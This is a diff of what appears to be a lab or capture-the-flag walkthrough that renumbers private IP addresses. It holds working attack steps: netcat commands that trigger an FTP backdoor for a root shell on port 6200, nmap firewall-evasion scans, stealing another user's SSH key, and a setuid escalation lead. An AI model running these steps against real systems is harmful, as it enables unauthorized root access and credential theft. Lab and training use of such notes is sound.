@@ -1,9 +1,9 @@
 Get ssh acces on ftp machine:
  open a terminal on the host machine and execute this command :
-	netcat 192.168.2.1 21
+	netcat 10.42.2.1 21
 * type "USER x:)" and then "PASS <anything>"
 * open another terminal on the host machine and execute this command :
-	netcat 192.168.2.1 6200 -p <port_1_to_1023>
+	netcat 10.42.2.1 6200 -p <port_1_to_1023>
 * you are now root on a remote shell on the ftp machine, type any sh command
 From now:
 1) Set up root password:
@@ -19,13 +19,13 @@ ssh root@ip_ftp
 
 Network discovery:
 1) Top-level view:
-	ip a => only one network : 192.168.2.1/24
+	ip a => only one network : 10.42.2.1/24
 	(apt install nmap):already here
-	nmap -sV 192.168.2.1/24 (get informartions on service as well)
-	Firewall at 192.168.2.2, a quick guess is there is at least one hidden network 
-	behind the firewall (what about: 192.168.3.1 ?Or 192.168.1.1)
+	nmap -sV 10.42.2.1/24 (get informartions on service as well)
+	Firewall at 10.42.2.2, a quick guess is there is at least one hidden network 
+	behind the firewall (what about: 10.42.3.1 ?Or 10.42.1.1)
 2)Further)
-	nmap 192.168.3.1 -Pn -sN -Sv => host is up & ssh (not vulnerable:openssh v8)
+	nmap 10.42.3.1 -Pn -sN -Sv => host is up & ssh (not vulnerable:openssh v8)
 	(-sN/-sF/-sX to escape firewall)
 
 Ssh connexion:
@@ -36,7 +36,7 @@ Going to steal him...
 cp /home/ouioui/.ssh/publickey ~/.ssh/
 Or impersonate him :
 su ouioui
-3) ssh ouioui@192.168.3.1
+3) ssh ouioui@10.42.3.1
 
 Getting root on last:
 There is a setuid program in /home/ouoi: net_int_handler
